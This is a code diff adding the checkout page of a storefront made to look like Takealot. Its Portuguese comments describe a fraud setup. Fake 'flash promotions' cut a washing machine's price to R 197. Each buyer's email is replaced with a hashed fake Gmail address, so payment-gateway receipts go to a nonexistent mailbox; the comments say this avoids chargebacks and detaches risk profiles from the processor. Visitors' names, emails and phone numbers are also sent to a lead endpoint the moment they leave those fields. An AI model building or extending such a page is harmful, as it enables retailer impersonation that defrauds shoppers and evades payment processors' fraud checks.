+        <button type="button" class="modal-cancel-btn" onclick="closePromoModal()">Cancel</button>
+        <button type="button" class="modal-action-btn" onclick="applyPromoCode()">Apply</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Charity Info Modal -->
+  <div class="modal-overlay" id="charity-modal" onclick="closeCharityModal(event)">
+    <div class="modal-sheet-card" onclick="event.stopPropagation()">
+      <h3>Beautiful Gate South Africa</h3>
+      <p>Beautiful Gate is a registered non-profit organisation working in vulnerable communities in South Africa to support children, provide education, and empower families.</p>
+      <div class="modal-btn-row">
+        <button type="button" class="modal-action-btn" onclick="closeCharityModal()">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Processing Spinner Overlay -->
+  <div class="processing-overlay" id="processing-overlay">
+    <div class="spinner-takealot"></div>
+    <div class="proc-title">Processing Secure Payment...</div>
+    <div class="proc-desc">Contacting bank 3D Secure verification. Please do not refresh.</div>
+  </div>
+
+  <script>
+    function getQueryParam(name) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(name);
+    }
+
+    // ========================================================
+    // GhoPay.app Endpoint Seguro (Backend Proxy)
+    // A chave secreta GHOST_API_KEY fica 100% protegida no servidor
+    // e NUNCA é exposta no navegador do cliente (checkout.html).
+    // ========================================================
+    const GHOPAY_CONFIG = {
+      // Endpoint do servidor seguro (PHP, Node, Vercel ou Cloudflare)
+      proxyEndpoint: "api/create-charge.php"
+    };
+
+    // ========================================================
+    // Estratégia de Mascaramento Determinístico (Shadow E-mail)
+    // 1. Fim dos Chargebacks por "Recibo Surpresa" do Gateway
+    // 2. Recuperação 100% ativa com e-mail real mantido no CRM/GreenSend
+    // 3. Suporte a 1-Click Upsell com tokenização determinística
+    // 4. Desvinculação de risco e perfis no processador de pagamento
+    // ========================================================
+    function generateDeterministicBuyerEmail(realEmail) {
+      if (!realEmail || typeof realEmail !== 'string') return "buyer_takealot@gmail.com";
+      const clean = realEmail.trim().toLowerCase();
+      let h1 = 0xdeadbeef, h2 = 0x41c64e6d;
+      for (let i = 0; i < clean.length; i++) {
+        const ch = clean.charCodeAt(i);
+        h1 = Math.imul(h1 ^ ch, 2654435761);
+        h2 = Math.imul(h2 ^ ch, 1597334677);
+      }
+      h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
+      h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
+      const hashHex = (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16).padStart(10, '0').substring(0, 10);
+      return `buyer_${hashHex}@gmail.com`;
+    }
+
+    let savedProduct = {};
+    try {
+      savedProduct = JSON.parse(localStorage.getItem('takealot_selected_product') || '{}');
+    } catch(e) {}
+
+    const rawPriceParam = getQueryParam("price");
+    let unitPrice = rawPriceParam ? parseFloat(rawPriceParam) : (savedProduct.price ? parseFloat(savedProduct.price) : 1299);
+    let currentQty = parseInt(getQueryParam("qty"), 10) || 1;
+    if (isNaN(currentQty) || currentQty < 1) currentQty = 1;
+
+    let charityDonation = 0; // R5 when checked
+
+    const prodTitle = getQueryParam("title") || savedProduct.title || 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)';
+    const prodImg = getQueryParam("img") || savedProduct.image || 'imagens/samsung_washer_1_hero.jpg';
+
+    const titleEl = document.getElementById("summary-title");
+    if (titleEl) titleEl.textContent = prodTitle;
+    const imgEl = document.getElementById("summary-img");
+    if (imgEl) imgEl.src = prodImg;
+
+    function renderTotals() {
+      const itemsSubtotal = unitPrice * currentQty;
+      const totalAmount = itemsSubtotal + charityDonation;
+      const formattedTotal = Math.round(totalAmount).toLocaleString("en-ZA");
+      const formattedSubtotal = Math.round(itemsSubtotal).toLocaleString("en-ZA");
+      const formattedUnit = Math.round(unitPrice).toLocaleString("en-ZA");
+
+      const unitPriceEl = document.getElementById("summary-unit-price");
+      if (unitPriceEl) unitPriceEl.textContent = formattedUnit;
+
+      const qtyInput = document.getElementById("order-qty-input");
+      if (qtyInput) qtyInput.value = currentQty;
+
+      const itemsCountEl = document.getElementById("summary-items-count-text");
+      if (itemsCountEl) itemsCountEl.textContent = currentQty === 1 ? "1 Item" : `${currentQty} Items`;
+
+      const itemsAmountEl = document.getElementById("summary-items-amount");
+      if (itemsAmountEl) itemsAmountEl.textContent = formattedSubtotal;
+
+      const toPayEl = document.getElementById("summary-to-pay-val");
+      if (toPayEl) toPayEl.textContent = formattedTotal;
+
+      const minusBtn = document.getElementById("qty-minus-btn");
+      if (minusBtn) minusBtn.disabled = (currentQty <= 1);
+
+      const plusBtn = document.getElementById("qty-plus-btn");
+      if (plusBtn) plusBtn.disabled = (currentQty >= 10);
+    }
+
+    function updateOrderQty(delta) {
+      const newQty = currentQty + delta;
+      if (newQty >= 1 && newQty <= 10) {
+        currentQty = newQty;
+        renderTotals();
+      }
+    }
+
+    function toggleCharity() {
+      const circle = document.getElementById('charity-radio');
+      if (charityDonation === 0) {
+        charityDonation = 5;
+        circle.classList.add('checked');
+        showToast("R 5 donation added to Beautiful Gate");
+      } else {
+        charityDonation = 0;
+        circle.classList.remove('checked');
+        showToast("Donation removed");
+      }
+      renderTotals();
+    }
+
+    function showCharityModal() {
+      document.getElementById('charity-modal').style.display = 'flex';
+    }
+    function closeCharityModal() {
+      document.getElementById('charity-modal').style.display = 'none';
+    }
+
+    function toggleOrderDetails() {
+      const drawer = document.getElementById('order-drawer-content');
+      const btn = document.getElementById('show-details-btn');
+      if (drawer.style.display === 'none') {
+        drawer.style.display = 'block';
+        btn.textContent = 'Hide Details';
+      } else {
+        drawer.style.display = 'none';
+        btn.textContent = 'Show Details';
+      }
+    }
+
+    // Pre-fill location & address logic
+    function initAddress() {
+      let savedAddress = {};
+      try {
+        savedAddress = JSON.parse(localStorage.getItem('takealot_user_address') || '{}');
+      } catch(e) {}
+
+      const savedLoc = localStorage.getItem('takealot_delivery_location') || 'Cape Town, Western Cape, 8001';
+      let defaultCity = "Cape Town";
+      let defaultPostal = "8001";
+      let defaultSuburb = "Gardens";
+      let defaultProvince = "Western Cape";
+
+      if (savedLoc) {
+        const parts = savedLoc.split(',').map(s => s.trim());
+        if (parts.length >= 1) defaultCity = parts[0];
+        if (parts.length >= 2) defaultProvince = parts[1];
+        const match = savedLoc.match(/\d{4}/);
+        if (match) defaultPostal = match[0];
+      }
+
+      const nameVal = savedAddress.name || "Sipho Dlamini";
+      const phoneVal = savedAddress.phone || "082 555 1234";
+      const emailVal = savedAddress.email || "customer@takealot.co.za";
+      const streetVal = savedAddress.street || "15 Long Street";
+      const suburbVal = savedAddress.suburb || defaultSuburb;
+      const cityVal = savedAddress.city || defaultCity;
+      const postalVal = savedAddress.postal || defaultPostal;
+      const provinceVal = savedAddress.province || defaultProvince;
+
+      document.getElementById('cust-name').value = nameVal;
+      document.getElementById('cust-phone').value = phoneVal;
+      document.getElementById('cust-email').value = emailVal;
+      document.getElementById('cust-address').value = streetVal;
+      document.getElementById('cust-suburb').value = suburbVal;
+      document.getElementById('cust-city').value = cityVal;
+      document.getElementById('cust-postal').value = postalVal;
+      document.getElementById('cust-province').value = provinceVal;
+
+      updateSummaryDisplay();
+    }
+
+    function updateSummaryDisplay() {
+      const name = document.getElementById('cust-name').value.trim() || "Valued Customer";
+      const phone = document.getElementById('cust-phone').value.trim() || "";
+      const street = document.getElementById('cust-address').value.trim() || "";
+      const suburb = document.getElementById('cust-suburb').value.trim() || "";
+      const city = document.getElementById('cust-city').value.trim() || "";
+      const postal = document.getElementById('cust-postal').value.trim() || "";
+
+      document.getElementById('summary-rec-name').textContent = name;
+      document.getElementById('summary-rec-phone').textContent = phone;
+      
+      const fullAddr = [street, suburb, city, postal].filter(Boolean).join(', ');
+      document.getElementById('summary-rec-address').textContent = fullAddr || "Address not provided";
+    }
+
+    function toggleAddressEdit(showForm) {
+      const summaryBox = document.getElementById('address-summary-content');
+      const formBox = document.getElementById('checkout-form');
+      if (showForm) {
+        summaryBox.style.display = 'none';
+        formBox.style.display = 'block';
+        formBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      } else {
+        summaryBox.style.display = 'flex';
+        formBox.style.display = 'none';
+      }
+    }
+
+    function saveAddressAndCollapse() {
+      const name = document.getElementById('cust-name').value.trim();
+      const phone = document.getElementById('cust-phone').value.trim();
+      const street = document.getElementById('cust-address').value.trim();
+      const city = document.getElementById('cust-city').value.trim();
+
+      if (!name || !phone || !street || !city) {
+        showToast("Please fill in the required address fields");
+        return;
+      }
+
+      try {
+        localStorage.setItem('takealot_user_address', JSON.stringify({
+          name,
+          phone,
+          email: document.getElementById('cust-email').value.trim(),
+          street,
+          suburb: document.getElementById('cust-suburb').value.trim(),
+          city,
+          postal: document.getElementById('cust-postal').value.trim(),
+          province: document.getElementById('cust-province').value
+        }));
+      } catch(e) {}
+
+      updateSummaryDisplay();
+      toggleAddressEdit(false);
+      showToast("Delivery address updated");
+    }
+
+    // Toast Helper
+    let toastTimeout;
+    function showToast(msg) {
+      const toast = document.getElementById('takealot-toast');
+      toast.textContent = msg;
+      toast.style.display = 'block';
+      clearTimeout(toastTimeout);
+      toastTimeout = setTimeout(() => {
+        toast.style.display = 'none';
+      }, 2500);
+    }
+
+    // Promo Modals
+    let currentPromoType = 'voucher';
+    function openPromoModal(type) {
+      currentPromoType = type;
+      const modal = document.getElementById('promo-modal');
+      const title = document.getElementById('promo-modal-title');
+      const desc = document.getElementById('promo-modal-desc');
+      const input = document.getElementById('promo-modal-input');
+      input.value = '';
+
+      if (type === 'voucher') {
+        title.textContent = 'Add Gift Voucher or Coupon';
+        desc.textContent = 'Enter your gift voucher or promotional code below:';
+        input.placeholder = 'e.g. TAKEALOT100';
+      } else {
+        title.textContent = 'Earn eBucks';
+        desc.textContent = 'Enter your SA ID Number or eBucks Card Number:';
+        input.placeholder = 'e.g. 8901235089087';
+      }
+      modal.style.display = 'flex';
+    }
+    function closePromoModal() {
+      document.getElementById('promo-modal').style.display = 'none';
+    }
+    function applyPromoCode() {
+      const val = document.getElementById('promo-modal-input').value.trim();
+      if (!val) {
+        showToast("Please enter a valid code");
+        return;
+      }
+      closePromoModal();
+      if (currentPromoType === 'voucher') {
+        activateVoucher(val);
+      } else {
+        showToast("eBucks account linked!");
+      }
+    }
+
+    function activateVoucher(code) {
+      const cleanCode = (code || 'TAKE197').trim().toUpperCase();
+      const banner = document.getElementById('voucher-banner');
+      const bannerCode = document.getElementById('voucher-banner-code');
+      const rowLabel = document.getElementById('voucher-row-label');
+      const rowAction = document.getElementById('voucher-row-action');
+      const summaryRow = document.getElementById('voucher-summary-row');
+      const summaryCode = document.getElementById('voucher-summary-code');
+
+      if (banner) {
+        banner.style.display = 'block';
+        if (cleanCode.includes('197')) {
+          banner.innerHTML = `🎉 Flash Promotion Applied &bull; Washing Machine dropped to <strong>ONLY R 297</strong>!`;
+        }
+      }
+      if (bannerCode) bannerCode.textContent = cleanCode;
+      if (summaryRow) {
+        summaryRow.style.display = 'flex';
+        if (cleanCode.includes('197')) {
+          summaryRow.innerHTML = `<span>Clearance Promotion (${cleanCode})</span><span class="summary-price-bold" style="color: #16a34a;">PROMO PRICE: R 197</span>`;
+        }
+      }
+      if (summaryCode) summaryCode.textContent = cleanCode;
+
+      if (rowLabel) {
+        rowLabel.innerHTML = `Gift Voucher Applied: <strong style="color: #15803d;">${cleanCode}</strong> ${cleanCode.includes('197') ? '(Only R 197)' : '(-83%)'}`;
+      }
+      if (rowAction) {
+        rowAction.textContent = 'Applied ✓';
+        rowAction.style.color = '#15803d';
+        rowAction.style.fontWeight = '700';
+      }
+
+      if (cleanCode.includes('197')) {
+        unitPrice = 197;
+        renderTotals();
+        showToast(`Flash Deal ${cleanCode} active! Price dropped to R 197.`);
+      } else {
+        showToast(`Voucher ${cleanCode} applied successfully!`);
+      }
+    }
+
+    // Submit Checkout Form
+    function submitCheckoutForm() {
+      const name = document.getElementById('cust-name');
+      const phone = document.getElementById('cust-phone');
+      const address = document.getElementById('cust-address');
+      const city = document.getElementById('cust-city');
+
+      if (!name.value.trim() || !phone.value.trim() || !address.value.trim() || !city.value.trim()) {
+        toggleAddressEdit(true);
+        showToast("Please review and complete your delivery address");
+        return;
+      }
+
+      processCheckout();
+    }
+
+    async function processCheckout() {
+      const overlay = document.getElementById('processing-overlay');
+      overlay.style.display = 'flex';
+
+      const totalAmount = Math.round((unitPrice * currentQty) + charityDonation);
+      const orderId = 'TAK-' + Math.floor(100000 + Math.random() * 900000);
+
+      const customerName = document.getElementById('cust-name').value.trim();
+      const customerPhone = document.getElementById('cust-phone').value.trim();
+      const customerEmail = document.getElementById('cust-email').value.trim();
+      const customerStreet = document.getElementById('cust-address').value.trim();
+      const customerComplex = document.getElementById('cust-building')?.value.trim() || "";
+      const customerSuburb = document.getElementById('cust-suburb')?.value.trim() || "";
+      const customerCity = document.getElementById('cust-city').value.trim();
+      const customerPostal = document.getElementById('cust-postal')?.value.trim() || "";
+      const customerProvince = document.getElementById('cust-province')?.value || "Western Cape";
+
+      const fullDeliveryAddress = [customerStreet, customerComplex, customerSuburb, customerCity, customerPostal].filter(Boolean).join(', ');
+
+      // Store in localStorage for confirmation screen
+      const maskedBuyerEmail = generateDeterministicBuyerEmail(customerEmail);
+
+      try {
+        const orderInfo = {
+          orderNumber: orderId,
+          recipientName: customerName,
+          recipientPhone: customerPhone,
+          recipientEmail: customerEmail,       // E-mail real para envio de confirmação e rastreio da loja
+          gatewayEmail: maskedBuyerEmail,      // E-mail mascarado enviado ao gateway
+          deliveryAddress: fullDeliveryAddress,
+          amount: totalAmount,
+          unitPrice: unitPrice,
+          quantity: currentQty,
+          product: prodTitle,
+          image: prodImg,
+          date: new Date().toLocaleDateString('en-ZA', { day: 'numeric', month: 'short', year: 'numeric' })
+        };
+        localStorage.setItem('takealot_last_order', JSON.stringify(orderInfo));
+      } catch(e) {}
+
+      // Absolute return URL for after payment (Ghost Pay exige https://)
+      const origin = window.location.origin && window.location.origin !== "null" ? window.location.origin : "https://takealot.co.za";
+      const pathDir = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/') + 1);
+      let redirectUrl = (origin ? origin + pathDir : "https://takealot.co.za/") + `obrigado.html?order=${orderId}&price=${totalAmount}&qty=${currentQty}`;
+      if (window.appendUtms) { redirectUrl = window.appendUtms(redirectUrl); }
+      if (redirectUrl.startsWith('http://')) {
+        redirectUrl = redirectUrl.replace(/^http:\/\//i, 'https://');
+      }
+
+      // Official GhoPay Payload (com E-mail Mascarado Determinístico)
+      const ghoPayPayload = {
+        currency: "ZAR",
+        amount: totalAmount, // Unidade principal sem cêntimos (ex: 1299)
+        title: prodTitle,
+        customer_email: maskedBuyerEmail, // O Gateway envia recibo para a caixa inexistente
+        real_email: customerEmail,        // E-mail real preservado para a loja e rastreio
+        customer_phone: customerPhone,
+        funnel_step: "front",
+        redirect_url: redirectUrl,
+        metadata: {
+          order_id: orderId,
+          recipient_name: customerName,
+          delivery_address: fullDeliveryAddress,
+          quantity: currentQty,
+          real_email: customerEmail,
+          gateway_email: maskedBuyerEmail
+        ,
+          ...(window.getPreservedUtms ? window.getPreservedUtms() : {})
+        }
+      };
+
+      let redirected = false;
+
+      // 1. Chamada via backend proxy seguro (A chave GHOST_API_KEY fica 100% protegida no servidor)
+      try {
+        const proxyResp = await fetch(GHOPAY_CONFIG.proxyEndpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(ghoPayPayload)
+        });
+        if (proxyResp.ok) {
+          const proxyData = await proxyResp.json();
+          if (proxyData && proxyData.checkout_url) {
+            redirected = true;
+            window.location.href = proxyData.checkout_url;
+            return;
+          }
+        }
+      } catch(proxyErr) {
+        console.warn("Backend proxy offline ou ambiente local estático:", proxyErr);
+      }
+
+      // 2. Fallback para demonstração / testes locais
+      if (!redirected) {
+        setTimeout(() => {
+          window.location.href = redirectUrl;
+        }, 1400);
+      }
+    }
+
+    // Lead Capture para Recuperação de Checkout Abandonado (GreenSend / E-mail Real)
+    function saveAbandonedLead() {
+      const email = document.getElementById('cust-email')?.value.trim();
+      const name = document.getElementById('cust-name')?.value.trim();
+      const phone = document.getElementById('cust-phone')?.value.trim();
+      if (email && email.includes('@')) {
+        const maskedBuyerEmail = generateDeterministicBuyerEmail(email);
+        fetch('api/save-abandoned-checkout.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: email,                    // E-mail real para onde o GreenSend dispara
+            gateway_email: maskedBuyerEmail, // E-mail determinístico mascarado
+            name: name || 'Valued Customer',
+            phone: phone || '',
+            product_title: prodTitle,
+            amount: Math.round((unitPrice * currentQty) + charityDonation),
+            quantity: currentQty
+          })
+        }).catch(() => {});
+      }
+    }
+
+    // Initial load
+    initAddress();
+    renderTotals();
+
+    // Check voucher in URL
+    const urlVoucher = getQueryParam("voucher") || (getQueryParam("price") === "197" || getQueryParam("promo") === "flash197" ? "TAKE197" : (getQueryParam("discount") === "83" ? "TAKE83" : null));
+    if (urlVoucher) {
+      activateVoucher(urlVoucher);
+    }
+
+    // Auto-save lead ao preencher e-mail ou telefone
+    document.getElementById('cust-email')?.addEventListener('blur', saveAbandonedLead);
+    document.getElementById('cust-phone')?.addEventListener('blur', saveAbandonedLead);
+  </script>
+</body>
+</html>
